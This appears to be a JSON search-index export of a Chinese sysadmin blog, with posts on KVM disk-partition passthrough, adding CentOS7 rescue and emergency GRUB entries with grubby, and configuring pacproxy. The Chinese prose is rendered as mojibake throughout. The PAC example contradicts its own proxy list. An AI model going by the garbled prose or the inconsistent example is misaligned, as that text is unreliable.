çš„å¤§ç›˜ç»™é€è¿›è™šæœºå‘¢ï¼Ÿ\nè¿™é‡Œé¢è¿˜çœŸæœ‰è¦æ³¨æ„çš„é—®é¢˜ï¼š\nImportant\nGuest virtual machines should not be given write access to whole disks or block devices (for example, /dev/sdb). Guest virtual machines with access to whole block devices may be able to modify volume labels, which can be used to compromise the host physical machine system. Use partitions (for example, /dev/sdb1) or LVM volumes to prevent this issue.\næ³¨æ„ä¸Šé¢çš„è¯´æ˜ï¼Œæ˜¯ä¸å»ºè®®å°†æ•´ä¸ªç¡¬ç›˜é€è¿›è™šæœºé‡Œé¢å»çš„ï¼Œå»ºè®®æ˜¯é€åˆ†åŒºè¿›å»ï¼Œé¿å…ä¼šå†™åæ•´ä¸ªç›˜ã€‚\næ‰€ä»¥å…ˆæŠŠç›˜çš„åˆ†åŒºåšå¥½ï¼Œæ ¼å¼åŒ–å¹¶æŒ‚è½½ï¼Œä»¥ /dev/sdb ä¸ºä¾‹\nparted -s /dev/sdb mklabel gpt mkpart primary 0% 100% mkfs.xfs /dev/sdb1 mount -t xfs /dev/sdb1 /mnt/sdb1 ç„¶ååˆ°å®ä½“æœºçš„ç£ç›˜ç›®å½•\n# cd /dev/disk/ # ls by-id by-path by-uuid # cd by-id # ll total 0 lrwxrwxrwx 1 root root 9 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d -\u0026gt; ../../sda lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part1 -\u0026gt; ../../sda1 lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part2 -\u0026gt; ../../sda2 lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part3 -\u0026gt; ../../sda3 lrwxrwxrwx 1 root root 9 11æœˆ 18 16:02 scsi-36b083fe0e4f71a002928bf63ef284827 -\u0026gt; ../../sdb lrwxrwxrwx 1 root root 10 11æœˆ 18 16:24 scsi-36b083fe0e4f71a002928bf63ef284827-part1 -\u0026gt; ../../sdb1 lrwxrwxrwx 1 root root 9 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d -\u0026gt; ../../sda lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part1 -\u0026gt; ../../sda1 lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part2 -\u0026gt; ../../sda2 lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part3 -\u0026gt; ../../sda3 lrwxrwxrwx 1 root root 9 11æœˆ 18 16:02 wwn-0x6b083fe0e4f71a002928bf63ef284827 -\u0026gt; ../../sdb lrwxrwxrwx 1 root root 10 11æœˆ 18 16:24 wwn-0x6b083fe0e4f71a002928bf63ef284827-part1 -\u0026gt; ../../sdb1 çœ‹ä¸­é—´ä¸€è¡Œï¼Œscsi-36b083fe0e4f71a002928bf63ef284827-part1 æŒ‡å‘ /dev/sdb1ï¼Œè®°å½•ä¸‹æ¥\nç„¶å virsh-edit ç¼–è¾‘ KVM è™šæœºæ–‡ä»¶ï¼Œå¢åŠ ç¡¬ç›˜éƒ¨åˆ†ï¼š\n\u0026lt;disk type=\u0026#39;block\u0026#39; device=\u0026#39;disk\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;source dev=\u0026#39;/dev/disk/by-id/scsi-36b083fe0e4f71a002928bf63ef284827-part1\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;vda\u0026#39; bus=\u0026#39;virtio\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; æ³¨ï¼šä¸Šé¢æˆ‘ä»¬æ˜¯ä½¿ç”¨äº† by-idï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ by-path å’Œ by-uuid æ¥æŒ‡å®šæºç›˜\né‡å¯è™šæœºå¹¶è¿›å…¥æŸ¥çœ‹ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°è¿™å—ç›˜ç›˜ç¬¦æ˜¯ /dev/vda\nfdisk -l Disk /dev/vda: 11755.9 GB, 11755860262912 bytes, 22960664576 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes æ¥ä¸‹æ¥å°±æ¯”è¾ƒæ€ªå¼‚äº†ï¼Œè¿™ä¸ªç›˜åˆ†æ˜æ²¡æœ‰åˆ†åŒºï¼Œæˆ‘ä»¬å´å¯ä»¥ç›´æ¥ mount\nmount -t xfs /dev/vda /material ç„¶å df -h å†çœ‹\nèƒ½è®¤å‡ºæ¥ï¼Œæ­£å¸¸ä½¿ç”¨å°±è¡Œäº†ã€‚\néå¸¸å¤æ€ªæ˜¯å§ã€‚\nå¤§å®¶è¿˜è¦æ³¨æ„å®ä½“æœºçš„æŒ‚è½½è·¯å¾„æ˜¯ /mnt/sdb1ï¼Œè™šæœºå†…çš„æŒ‚è½½è·¯å¾„æ˜¯ /materialï¼Œè¿™ä¸¤ä¸ªè·¯å¾„éƒ½æ˜¯æŒ‡å‘åŒä¸€å—ç›˜ï¼Œå¯ä»¥å…±é€šã€‚\n","permalink":"https://rendoumi.com/posts/20211119-kvm_disk_passthrough/","summary":"\u003cp\u003eè¿™ä¸ªæ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹è¦å­˜æ”¾ 2TB çš„æ•°æ®ï¼Œä½†æ˜¯ç³»ç»Ÿæ˜¯ 1.7TB çš„ 4 å— 600G ç›˜ç»„æˆçš„ Raid10ã€‚\u003c/p\u003e\n\u003cp\u003eå¾ˆæ˜æ˜¾ç›˜ç©ºé—´ä¸å¤Ÿäº†ï¼Œå»åº“æˆ¿æ‰¾ä¸¤å— 10TB çš„å¤§ç›˜ç»„æˆ Raid1 ç»™ä»–ç”¨å¥½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé—®é¢˜æ¥äº†ï¼Œç³»ç»Ÿæ˜¯ KVM è™šæœºï¼Œæ€æ ·æŠŠè¿™ä¸ª 10TB çš„å¤§ç›˜ç»™é€è¿›è™šæœºå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œé¢è¿˜çœŸæœ‰è¦æ³¨æ„çš„é—®é¢˜ï¼š\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eImportant\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eGuest virtual machines should not be given write access to whole disks or block devices (for example, /dev/sdb).\u003c/strong\u003e Guest virtual  machines with access to whole block devices may be able to modify  volume labels, which can be used to compromise the host physical  machine system. \u003cstrong\u003eUse partitions (for example, /dev/sdb1) or LVM  volumes to prevent this issue.\u003c/strong\u003e\u003c/p\u003e","title":"KVMä¸‹é™„åŠ ç¡¬ç›˜çš„passthroughç›´é€š"},{"content":"è¯´åˆ° CentOS7 çš„ç´§æ€¥æ¨¡å¼ä¸æ•‘æ´æ¨¡å¼ï¼Œç½‘ä¸Šå¯ä»¥æœåˆ°æ¼«å¤©é£çš„å¸–å­ï¼Œè¯´ä¸€ä¸‹åŒºåˆ«\nRESCUE æ•‘æ´æ¨¡å¼ï¼š æ•‘æ´æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ²¡æœ‰æŒ‚è½½ç¡¬ç›˜ï¼Œå¯ä»¥å°†ç¡¬ç›˜ mount å‡ºç„¶åæ‹·å‡ºæ•°æ®ã€‚\nEMERGENCY ç´§æ€¥æ¨¡å¼ï¼š ç´§æ€¥æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªæœ€å°çš„ç¯å¢ƒã€‚æ ¹ç›®å½•æ¡£æ¡ˆç³»ç»Ÿå°†ä¼šè¢«æŒ‚è½½ä¸ºä»…èƒ½è¯»å–ï¼Œè€Œä¸”å°†ä¸ä¼šåšä»»ä½•çš„è®¾å®šã€‚\nå½“ç„¶è¿›å…¥çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè¿›å…¥ç³»ç»Ÿçš„æ—¶å€™æŒ‰ e ä¿®æ”¹ grub èœå•å‚æ•°ï¼Œå°±å¯ä»¥è¿›å…¥ä¸åŒçš„æ¨¡å¼\næœ¬æ–‡è®¨è®ºçš„é‡ç‚¹ä¸æ˜¯æ€ä¹ˆè¿›å»ï¼Œè€Œæ˜¯é‚£ä¸¤å¥å‘½ä»¤ï¼Œåœ¨ç´§æ€¥çŠ¶æ€ä¸‹åæ­£æˆ‘æ˜¯è®°ä¸ä½çš„\nsystemd.unit=rescue.target systemd.unit=emergency.target éƒ½æ²¡æœ‰ä¹‹å‰çš„ single ç®€å•ï¼Œä¹Ÿå®Œå…¨è®°ä¸ä½ï¼Œæ—¢ç„¶è®°ä¸ä½ï¼Œé‚£å°±å¹²è„†åšåˆ°èœå•é‡Œå¥½äº†ï¼Œè¿™æ‰æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚\nç°åœ¨éƒ½æ˜¯ä½¿ç”¨ grub2 äº†ï¼Œè€Œä¸æ˜¯ grubï¼Œè¿™å¾ˆé‡è¦ã€‚grub2çš„é…ç½®æ–‡ä»¶æ˜¯ /boot/grub2/grub.cfgã€‚\nä¿®æ”¹ grub2 æœ‰ä¸¤ä¸ªå·¥å…·ï¼Œgrub2-mkconfig å’Œ grubbyï¼Œä¸è¦åŒæ—¶ä½¿ç”¨è¿™ä¸¤ä¸ªå·¥å…·ä¿®æ”¹ï¼Œä¼šè¦†ç›–çš„\ngrub2-mkconfig ä¼šå»æœç´¢ /boot ç›®å½•ä¸‹çš„å†…æ ¸æ–‡ä»¶ï¼Œæœ‰å¤šå°‘ä¸ªå†…æ ¸å°±ä¼šç”Ÿæˆå¤šå°‘ä¸ªå¯åŠ¨é¡¹ã€‚é‚£ä¹ˆå¦‚æœæ˜¯åŒä¸€ä¸ªå†…æ ¸ï¼Œæƒ³ä¿®æ”¹ä¸åŒçš„å¯åŠ¨å‚æ•°ï¼Œåšå¤šä¸ªå¯åŠ¨é¡¹å°±å®Œè›‹ï¼Œä»–ä¸èƒ½è‡ªåŠ¨ç”Ÿæˆå•å†…æ ¸çš„å¤šä¸ªå¯åŠ¨é¡¹ grubby å¾ˆçµæ´»ï¼Œå¯ä»¥æ ¹æ®å½“å‰ grub2 çš„é…ç½®ï¼Œç”Ÿæˆä¸€ä¸ªå†…æ ¸ï¼Œå¤šä¸ªä¸åŒå¯åŠ¨å‚æ•°çš„å¤šä¸ªå¯åŠ¨é¡¹ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¦åŠ è¿›å»ä¸¤ä¸ªåªæ˜¯å¯åŠ¨å‚æ•°ä¸åŒï¼Œå†…æ ¸å…¶å®ä¸€æ ·çš„å¯åŠ¨é¡¹ï¼Œç”¨ grubby å°±å¥½äº†\ngrubby --add-kernel=\\$(ls -1cat /boot/vmlinuz*|grep rescue) --title=\u0026#34;RESCUE BOOT\u0026#34; --initrd=\\$(ls -1cat /boot/initramfs*|grep rescue) --args=\u0026#34;systemd.unit=rescue.target\u0026#34; --copy-default grubby --add-kernel=\\$(ls -1cat /boot/vmlinuz*|grep rescue) --title=\u0026#34;EMERGENCY BOOT\u0026#34; --initrd=\\$(ls -1cat /boot/initramfs*|grep rescue) --args=\u0026#34;systemd.unit=emergency.target\u0026#34; --copy-default åˆ‡å¿Œæˆ‘ä»¬ä¹‹åä¸èƒ½è¿è¡Œ\ngrub2-mkconfig -o /boot/grub2/grub.cfg å¦åˆ™ä¸Šé¢çš„ä¸¤ä¸ªå¯åŠ¨é¡¹èœå•ä¼šæ¶ˆå¤±ï¼Œå› ä¸º grub2-mkconfig é…ç½®çš„è¯ä¸€ä¸ªå†…æ ¸åªèƒ½æœ‰ä¸€ä¸ªå¯åŠ¨é¡¹\ngrub2-mkconfig ä¹Ÿæœ‰è‡ªå·±çš„å¼ºé¡¹ï¼Œå¦‚æœè¦ä¿®æ”¹ç¼ºçœçš„èœå•è¶…æ—¶æ—¶é—´ï¼Œgrubby å°±åšä¸åˆ°äº†\nsed -i \u0026#39;/^GRUB_TIMEOUT=/s/^.*$/GRUB_TIMEOUT=10/\u0026#39; /etc/default/grub grub2-mkconfig -o /boot/grub2/grub.cfg ","permalink":"https://rendoumi.com/posts/20211119-linux_rescue/","summary":"\u003cp\u003eè¯´åˆ° CentOS7 çš„ç´§æ€¥æ¨¡å¼ä¸æ•‘æ´æ¨¡å¼ï¼Œç½‘ä¸Šå¯ä»¥æœåˆ°æ¼«å¤©é£çš„å¸–å­ï¼Œè¯´ä¸€ä¸‹åŒºåˆ«\u003c/p\u003e\n\u003cp\u003eRESCUE æ•‘æ´æ¨¡å¼ï¼š\næ•‘æ´æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ²¡æœ‰æŒ‚è½½ç¡¬ç›˜ï¼Œå¯ä»¥å°†ç¡¬ç›˜ mount å‡ºç„¶åæ‹·å‡ºæ•°æ®ã€‚\u003c/p\u003e\n\u003cp\u003eEMERGENCY ç´§æ€¥æ¨¡å¼ï¼š\nç´§æ€¥æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªæœ€å°çš„ç¯å¢ƒã€‚æ ¹ç›®å½•æ¡£æ¡ˆç³»ç»Ÿå°†ä¼šè¢«æŒ‚è½½ä¸ºä»…èƒ½è¯»å–ï¼Œè€Œä¸”å°†ä¸ä¼šåšä»»ä½•çš„è®¾å®šã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶è¿›å…¥çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè¿›å…¥ç³»ç»Ÿçš„æ—¶å€™æŒ‰ e ä¿®æ”¹ grub èœå•å‚æ•°ï¼Œå°±å¯ä»¥è¿›å…¥ä¸åŒçš„æ¨¡å¼\u003c/p\u003e\n\u003cp\u003eæœ¬æ–‡è®¨è®ºçš„é‡ç‚¹ä¸æ˜¯æ€ä¹ˆè¿›å»ï¼Œè€Œæ˜¯é‚£ä¸¤å¥å‘½ä»¤ï¼Œåœ¨ç´§æ€¥çŠ¶æ€ä¸‹åæ­£æˆ‘æ˜¯è®°ä¸ä½çš„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemd.unit\u003cspan class=\"o\"\u003e=\u003c/span\u003erescue.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemd.unit\u003cspan class=\"o\"\u003e=\u003c/span\u003eemergency.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eéƒ½æ²¡æœ‰ä¹‹å‰çš„ single ç®€å•ï¼Œä¹Ÿå®Œå…¨è®°ä¸ä½ï¼Œæ—¢ç„¶è®°ä¸ä½ï¼Œé‚£å°±å¹²è„†åšåˆ°èœå•é‡Œå¥½äº†ï¼Œè¿™æ‰æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003eç°åœ¨éƒ½æ˜¯ä½¿ç”¨ grub2 äº†ï¼Œè€Œä¸æ˜¯ grubï¼Œè¿™å¾ˆé‡è¦ã€‚grub2çš„é…ç½®æ–‡ä»¶æ˜¯ /boot/grub2/grub.cfgã€‚\u003c/p\u003e\n\u003cp\u003eä¿®æ”¹ grub2 æœ‰ä¸¤ä¸ªå·¥å…·ï¼Œgrub2-mkconfig å’Œ grubbyï¼Œä¸è¦åŒæ—¶ä½¿ç”¨è¿™ä¸¤ä¸ªå·¥å…·ä¿®æ”¹ï¼Œä¼šè¦†ç›–çš„\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003egrub2-mkconfig ä¼šå»æœç´¢ /boot ç›®å½•ä¸‹çš„å†…æ ¸æ–‡ä»¶ï¼Œæœ‰å¤šå°‘ä¸ªå†…æ ¸å°±ä¼šç”Ÿæˆå¤šå°‘ä¸ªå¯åŠ¨é¡¹ã€‚é‚£ä¹ˆå¦‚æœæ˜¯åŒä¸€ä¸ªå†…æ ¸ï¼Œæƒ³ä¿®æ”¹ä¸åŒçš„å¯åŠ¨å‚æ•°ï¼Œåšå¤šä¸ªå¯åŠ¨é¡¹å°±å®Œè›‹ï¼Œä»–ä¸èƒ½è‡ªåŠ¨ç”Ÿæˆå•å†…æ ¸çš„å¤šä¸ªå¯åŠ¨é¡¹\u003c/li\u003e\n\u003cli\u003egrubby å¾ˆçµæ´»ï¼Œå¯ä»¥æ ¹æ®å½“å‰ grub2 çš„é…ç½®ï¼Œç”Ÿæˆä¸€ä¸ªå†…æ ¸ï¼Œå¤šä¸ªä¸åŒå¯åŠ¨å‚æ•°çš„å¤šä¸ªå¯åŠ¨é¡¹ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé‚£ä¹ˆæˆ‘ä»¬è¦åŠ è¿›å»ä¸¤ä¸ªåªæ˜¯å¯åŠ¨å‚æ•°ä¸åŒï¼Œå†…æ ¸å…¶å®ä¸€æ ·çš„å¯åŠ¨é¡¹ï¼Œç”¨ grubby å°±å¥½äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrubby --add-kernel\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/vmlinuz*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --title\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;RESCUE BOOT\u0026#34;\u003c/span\u003e --initrd\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/initramfs*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --args\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;systemd.unit=rescue.target\u0026#34;\u003c/span\u003e --copy-default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrubby --add-kernel\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/vmlinuz*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --title\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;EMERGENCY BOOT\u0026#34;\u003c/span\u003e --initrd\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003els -1cat /boot/initramfs*\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep rescue\u003cspan class=\"o\"\u003e)\u003c/span\u003e --args\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;systemd.unit=emergency.target\u0026#34;\u003c/span\u003e --copy-default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåˆ‡å¿Œæˆ‘ä»¬ä¹‹åä¸èƒ½è¿è¡Œ\u003c/p\u003e","title":"CentOS7çš„æ•‘æ´æ¨¡å¼å’Œç´§æ€¥æ¨¡å¼"},{"content":"è¯´å®åœ¨è¯ï¼Œè¿™ä¸ªåœºæ™¯éå¸¸æ€ªå¼‚ï¼Œå®¢æˆ·åœ¨ linux ä¸‹è¦åŠ¨æ€æ ¹æ® url é€‰æ‹©ä»£ç†ï¼š\nçœ‹å›¾ï¼Œä¸­é—´çš„æ˜¯å‰ç«¯ä»£ç†ï¼Œåœ°å€æ˜¯ 192.168.1.1:8080ï¼Œç„¶åå®¢æˆ·è®¾ç½®ä½¿ç”¨è¿™ä¸ªä»£ç†\nexport http_proxy=http://192.168.1.1:8080 export https_proxy=http://192.168.1.1:8080 ç„¶åå¯¹åº”åç«¯æœ‰ä¸‰ä¸ªä»£ç†ï¼Œä¸¤ä¸ª http ä»£ç†ï¼Œä¸€ä¸ª socks ä»£ç†\nhttp 192.168.2.1:3128 socks 192.168.2.2:1080 http 192.168.2.3:3128 æˆ‘ä»¬è¦æ ¹æ®å®¢æˆ·çš„è¯·æ±‚ URL æ¥å†³å®šå…·ä½“è¦ä½¿ç”¨åç«¯çš„å“ªä¸ªä»£ç†\nè¿™ä¸ªå¦‚æœåœ¨æµè§ˆå™¨ä¸Šè®¾ç½®éå¸¸å®¹æ˜“ï¼Œè®¾ç½® PAC å³å¯ã€‚ä½†æ˜¯ååå®¢æˆ·ç«¯ä¸æ˜¯æµè§ˆå™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªç¨‹åºï¼Œé‚£ä¹ˆéº»çƒ¦å°±æ¥äº†ã€‚æ€ä¹ˆè®¾ç½®å‘¢ï¼Ÿ\næ­¥éª¤å¾ˆç®€å•ï¼š\nä¸€ã€å®‰è£… pacproxy ç½‘å€ï¼šhttps://github.com/williambailey/pacproxy\nwget https://github.com/williambailey/pacproxy/releases/download/v.2.0.4/pacproxy_2.0.4_linux_amd64.tar.gz tar zxvf pacproxy_2.0.4_linux_amd64.tar.gz æ‹·å‡ºæ¥ pacproxy å¤‡ç”¨\näºŒã€ç”Ÿæˆé…ç½®æ–‡ä»¶ æœ€ä¸»è¦çš„å°±æ˜¯ PAC æ–‡ä»¶çš„ç”Ÿæˆ\næˆ‘ä»¬ç»™ä¸ªä¾‹å­ï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pac function FindProxyForURL(url, host) { if (host == \u0026#34;www.baidu.com\u0026#34;) { return \u0026#34;PROXY 192.168.2.1:3128\u0026#34;; } else if (host == \u0026#34;www.sina.com.cn\u0026#34;) { return \u0026#34;SOCKS 192.168.2.2:1080\u0026#34;; } else if (host == \u0026#34;www.sohu.com\u0026#34;) { return \u0026#34;SOCKS 192.168.2.3:1080\u0026#34;; } else { return \u0026#34;DIRECT\u0026#34;; } } EOF å…¶å® PAC æ–‡ä»¶çš„å†…å®¹å°±æ˜¯ä¸€æ®µ javascriptï¼Œç”¨æ¥è¿”å›ä»£ç†çš„åœ°å€\nè¿è¡Œå¹¶æµ‹è¯•ï¼š\npacproxy -c pac -l 0.0.0.0:8080 -v export http_proxy=http://192.168.1.1:8080 export https_proxy=http://192.168.1.1:8080 curl -I www.baidu.com è¿™æ ·å°±åœ¨ Linux æ­å»ºäº†ä¸€ä¸ªåŠ¨æ€çš„ PAC ä»£ç†\nPACæ–‡ä»¶çš„å‚è€ƒèµ„æ–™ï¼š\nhttps://web.archive.org/web/20070602031929/http://wp.netscape.com/eng/mozilla/2.0/relnotes/demo/proxy-live.html\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_PAC_file\nhttps://www.websense.com/content/support/library/web/v76/pac_file_best_practices/PAC_file_sample.aspx\n","permalink":"https://rendoumi.com/posts/20211116-pacproxy/","summary":"\u003cp\u003eè¯´å®åœ¨è¯ï¼Œè¿™ä¸ªåœºæ™¯éå¸¸æ€ªå¼‚ï¼Œå®¢æˆ·åœ¨ linux ä¸‹è¦åŠ¨æ€æ ¹æ® url é€‰æ‹©ä»£ç†ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211116132624536\" loading=\"lazy\" src=\"/posts/20211116-pacproxy/image-20211116132624536.png\"\u003e\u003c/p\u003e\n\u003cp\u003eçœ‹å›¾ï¼Œä¸­é—´çš„æ˜¯å‰ç«¯ä»£ç†ï¼Œåœ°å€æ˜¯ 192.168.1.1:8080ï¼Œç„¶åå®¢æˆ·è®¾ç½®ä½¿ç”¨è¿™ä¸ªä»£ç†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://192.168.1.1:8080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttps_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://192.168.1.1:8080\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå¯¹åº”åç«¯æœ‰ä¸‰ä¸ªä»£ç†ï¼Œä¸¤ä¸ª http ä»£ç†ï¼Œä¸€ä¸ª socks ä»£ç†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp  192.168.2.1:3128\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocks 192.168.2.2:1080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp  192.168.2.3:3128\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬è¦æ ¹æ®å®¢æˆ·çš„è¯·æ±‚ URL æ¥å†³å®šå…·ä½“è¦ä½¿ç”¨åç«¯çš„å“ªä¸ªä»£ç†\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªå¦‚æœåœ¨æµè§ˆå™¨ä¸Šè®¾ç½®éå¸¸å®¹æ˜“ï¼Œè®¾ç½® PAC å³å¯ã€‚ä½†æ˜¯ååå®¢æˆ·ç«¯ä¸æ˜¯æµè§ˆå™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªç¨‹åºï¼Œé‚£ä¹ˆéº»çƒ¦å°±æ¥äº†ã€‚æ€ä¹ˆè®¾ç½®å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¾ˆç®€å•ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…-pacproxy\"\u003eä¸€ã€å®‰è£… pacproxy\u003c/h2\u003e\n\u003cp\u003eç½‘å€ï¼šhttps://github.com/williambailey/pacproxy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/williambailey/pacproxy/releases/download/v.2.0.4/pacproxy_2.0.4_linux_amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf pacproxy_2.0.4_linux_amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ‹·å‡ºæ¥ pacproxy å¤‡ç”¨\u003c/p\u003e\n\u003ch2 id=\"äºŒç”Ÿæˆé…ç½®æ–‡ä»¶\"\u003eäºŒã€ç”Ÿæˆé…ç½®æ–‡ä»¶\u003c/h2\u003e\n\u003cp\u003eæœ€ä¸»è¦çš„å°±æ˜¯ PAC æ–‡ä»¶çš„ç”Ÿæˆ\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç»™ä¸ªä¾‹å­ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pac\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003efunction FindProxyForURL(url, host)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    if (host == 